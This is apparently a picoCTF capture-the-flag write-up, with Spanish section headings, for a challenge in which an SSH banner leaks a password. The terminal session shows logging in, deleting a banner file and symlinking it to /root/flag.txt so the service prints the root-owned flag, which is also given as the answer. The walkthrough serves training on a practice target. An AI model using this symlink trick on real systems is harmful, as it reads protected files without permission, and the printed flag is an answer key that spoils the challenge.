## Descripción del reto
Can you abuse the banner?The server has been leaking some crucial information on `tethys.picoctf.net 61818`. Use the leaked information to get to the server.To connect to the running application use `nc tethys.picoctf.net 51590`. From the above information abuse the machine and find the flag in the /root directory.

## Solución

```
BLOODANGELIX-picoctf@webshell:~$ nc tethys.picoctf.net 61818
SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234
^C
BLOODANGELIX-picoctf@webshell:~$ nc tethys.picoctf.net 51590
*********************************************
***************DEFAULT BANNER****************
*Please supply banner in /home/player/banner*
*********************************************
what is the password? 
My_Passw@rd_@1234
What is the top cyber security conference in the world?
DEFCON
the first hacker ever was known for phreaking(making free phone calls), who was it?
John Draper
player@challenge:~$ ls
ls
banner  text
player@challenge:~$ ls ..
ls ..
player
player@challenge:~$ cd /
cd /
player@challenge:/$ ls
ls
bin   challenge  etc   lib    media  opt   root  sbin  sys  usr
boot  dev        home  lib64  mnt    proc  run   srv   tmp  var
player@challenge:/$ cd home
cd home
player@challenge:/home$ ls
ls
player
player@challenge:/home$ cd player
cd player
player@challenge:~$ ls
ls
banner  text
player@challenge:~$ rm -rf banner
rm -rf banner
player@challenge:~$ ls
ls
text
player@challenge:~$ ln -s /root/flag.txt banner
ln -s /root/flag.txt banner
player@challenge:~$ ls
ls
banner  text
player@challenge:~$ ^C
BLOODANGELIX-picoctf@webshell:~$ nc tethys.picoctf.net 51590
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_b3ee718e}

what is the password? 
```

picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_b3ee718e}
## Notas


## Referencia
